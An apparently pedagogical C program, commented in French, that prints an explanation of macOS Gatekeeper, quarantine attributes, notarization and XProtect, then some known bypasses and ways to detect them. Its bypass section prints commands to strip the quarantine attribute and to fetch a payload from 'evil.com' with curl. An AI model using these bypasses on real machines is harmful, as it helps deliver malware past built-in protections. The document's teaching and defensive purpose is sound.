/*
 * OBJECTIF  : Comprendre Gatekeeper et la quarantaine macOS
 * PREREQUIS : Bases C, code signing, xattr, securite macOS
 * COMPILE   : clang -o example example.c
 *
 * Ce programme demontre le fonctionnement de Gatekeeper :
 * attribut de quarantaine, notarization, verification de
 * signature, et techniques de contournement connues.
 * Demonstration pedagogique.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

/*
 * Etape 1 : Architecture de Gatekeeper
 */
static void explain_gatekeeper(void) {
    printf("[*] Etape 1 : Architecture de Gatekeeper\n\n");

    printf("    ┌──────────────────────────────────────────┐\n");
    printf("    │  Telechargement (Safari, Chrome, etc.)    │\n");
    printf("    │       │                                   │\n");
    printf("    │       v                                   │\n");
    printf("    │  com.apple.quarantine (xattr)            │\n");
    printf("    │  ┌──────────────────────────────┐        │\n");
    printf("    │  │ Flag + AppID + Timestamp      │        │\n");
    printf("    │  └──────────────────────────────┘        │\n");
    printf("    │       │                                   │\n");
    printf("    │       v  (premiere execution)             │\n");
    printf("    │  Gatekeeper Verification                 │\n");
    printf("    │  ┌──────────────────────────────┐        │\n");
    printf("    │  │ 1. Verifier la quarantaine    │        │\n");
    printf("    │  │ 2. Verifier la signature       │        │\n");
    printf("    │  │ 3. Verifier la notarization    │        │\n");
    printf("    │  │ 4. Verifier les XProtect rules │        │\n");
    printf("    │  └──────────────────────────────┘        │\n");
    printf("    │       │                                   │\n");
    printf("    │       v                                   │\n");
    printf("    │  Autoriser / Bloquer / Alerter            │\n");
    printf("    └──────────────────────────────────────────┘\n\n");
}

/*
 * Etape 2 : Attribut de quarantaine
 */
static void demo_quarantine(void) {
    printf("[*] Etape 2 : Attribut de quarantaine\n\n");

    printf("    L'attribut com.apple.quarantine :\n");
    printf("    ───────────────────────────────────\n");
    printf("    Format : FLAG;TIMESTAMP;APPNAME;UUID\n");
    printf("    Exemple : 0083;6571f3a2;Safari;ABC-DEF\n\n");

    printf("    FLAGS :\n");
    printf("    0x0001 : Fichier telecharge\n");
    printf("    0x0002 : Fichier en quarantaine\n");
    printf("    0x0040 : Pas encore verifie\n");
    printf("    0x0080 : Fichier a ete verifie et approuve\n\n");

    /* Verifier l'attribut sur notre binaire */
    printf("    Verification de l'attribut sur quelques fichiers :\n");
    const char *files[] = {"/Applications/Safari.app",
                           "/usr/bin/ls", NULL};

    for (int i = 0; files[i]; i++) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd),
                 "xattr -p com.apple.quarantine '%s' 2>&1", files[i]);
        printf("    %s :\n", files[i]);
        FILE *fp = popen(cmd, "r");
        if (fp) {
            char line[256];
            if (fgets(line, sizeof(line), fp)) {
                line[strcspn(line, "\n")] = '\0';
                printf("      %s\n", line);
            }
            pclose(fp);
        }
    }
    printf("\n");

    printf("    Manipulation de la quarantaine :\n");
    printf("    ───────────────────────────────────\n");
    printf("    # Afficher\n");
    printf("    xattr -p com.apple.quarantine file\n\n");
    printf("    # Supprimer (bypass Gatekeeper !)\n");
    printf("    xattr -d com.apple.quarantine file\n\n");
    printf("    # Supprimer recursivement\n");
    printf("    xattr -r -d com.apple.quarantine App.app\n\n");
}

/*
 * Etape 3 : Notarization
 */
static void explain_notarization(void) {
    printf("[*] Etape 3 : Notarization\n\n");

    printf("    Processus de notarization :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Developper signe avec Developer ID\n");
    printf("    2. Soumet a Apple via notarytool :\n");
    printf("       xcrun notarytool submit app.zip \\\n");
    printf("           --apple-id dev@email.com \\\n");
    printf("           --team-id TEAM123\n");
    printf("    3. Apple analyse (malware, API dangereuses)\n");
    printf("    4. Apple delivre un ticket\n");
    printf("    5. Le ticket est agrafe au binaire :\n");
    printf("       xcrun stapler staple App.app\n\n");

    printf("    Verification :\n");
    printf("    ───────────────────────────────────\n");
    printf("    spctl -a -vv App.app\n");
    printf("    # source=Notarized Developer ID\n\n");

    /* Verifier le statut de Gatekeeper */
    printf("    Statut de Gatekeeper :\n");
    FILE *fp = popen("spctl --status 2>&1", "r");
    if (fp) {
        char line[256];
        if (fgets(line, sizeof(line), fp)) {
            line[strcspn(line, "\n")] = '\0';
            printf("      %s\n", line);
        }
        pclose(fp);
    }
    printf("\n");
}

/*
 * Etape 4 : XProtect
 */
static void explain_xprotect(void) {
    printf("[*] Etape 4 : XProtect (antimalware integre)\n\n");

    printf("    XProtect = antivirus basique integre a macOS\n\n");

    printf("    Composants :\n");
    printf("    ───────────────────────────────────\n");
    printf("    XProtect.bundle     : signatures de malware\n");
    printf("    XProtectRemediator  : outil de nettoyage\n");
    printf("    MRT.app             : Malware Removal Tool\n\n");

    printf("    Emplacement des signatures :\n");
    struct stat st;
    const char *xprotect_paths[] = {
        "/Library/Apple/System/Library/CoreServices/XProtect.bundle",
        "/System/Library/CoreServices/XProtect.bundle",
        NULL
    };

    for (int i = 0; xprotect_paths[i]; i++) {
        if (stat(xprotect_paths[i], &st) == 0) {
            printf("    [!] %s (present)\n", xprotect_paths[i]);
        }
    }
    printf("\n");

    printf("    Les signatures sont mises a jour automatiquement\n");
    printf("    via la mise a jour logicielle (silencieusement)\n\n");
}

/*
 * Etape 5 : Techniques de contournement
 */
static void explain_bypasses(void) {
    printf("[*] Etape 5 : Techniques de contournement\n\n");

    printf("    1. Supprimer l'attribut de quarantaine\n");
    printf("    ───────────────────────────────────\n");
    printf("    xattr -d com.apple.quarantine payload\n");
    printf("    # Si l'utilisateur peut executer xattr\n\n");

    printf("    2. Utiliser curl/wget (pas de quarantaine)\n");
    printf("    ───────────────────────────────────\n");
    printf("    curl -o payload http://evil.com/payload\n");
    printf("    # curl n'ajoute PAS l'attribut quarantine\n\n");

    printf("    3. Python/Ruby/etc (interpretes)\n");
    printf("    ───────────────────────────────────\n");
    printf("    python3 -c 'import os; os.system(\"whoami\")'\n");
    printf("    # Les scripts ne passent pas par Gatekeeper\n\n");

    printf("    4. DMG avec lien symbolique\n");
    printf("    ───────────────────────────────────\n");
    printf("    # Historiquement : symlink vers /Applications\n");
    printf("    # L'app copiee perdait la quarantaine\n\n");

    printf("    5. Archive sans quarantaine propagee\n");
    printf("    ───────────────────────────────────\n");
    printf("    # Certains outils de decompression ne propagent pas\n");
    printf("    # l'attribut quarantine aux fichiers extraits\n\n");

    printf("    Rappel : ces techniques sont documentees pour\n");
    printf("    la recherche en securite defensive\n\n");
}

/*
 * Etape 6 : Detection et protection
 */
static void explain_detection(void) {
    printf("[*] Etape 6 : Detection et renforcement\n\n");

    printf("    Commandes de diagnostic :\n");
    printf("    ───────────────────────────────────\n");
    printf("    spctl --status           # Gatekeeper on/off\n");
    printf("    spctl -a -vv binary      # Verifier un binaire\n");
    printf("    xattr -l file            # Lister les xattr\n");
    printf("    syspolicyd               # Daemon Gatekeeper\n\n");

    printf("    Surveiller les contournements :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Monitorer les suppressions de quarantine\n");
    printf("       -> Endpoint Security : ES_EVENT_TYPE_AUTH_SETXATTR\n\n");
    printf("    2. Detecter les telechargements sans quarantine\n");
    printf("       -> curl, wget, python dans les logs\n\n");
    printf("    3. Verifier que Gatekeeper est actif\n");
    printf("       -> MDM policy enforcement\n\n");

    printf("    Protections :\n");
    printf("    - Ne jamais desactiver Gatekeeper\n");
    printf("    - MDM pour forcer les politiques\n");
    printf("    - Surveiller les xattr modifiees\n");
    printf("    - Endpoint Security pour les evenements fichier\n\n");
}

int main(void) {
    printf("[*] Demo : Gatekeeper macOS\n\n");

    explain_gatekeeper();
    demo_quarantine();
    explain_notarization();
    explain_xprotect();
    explain_bypasses();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
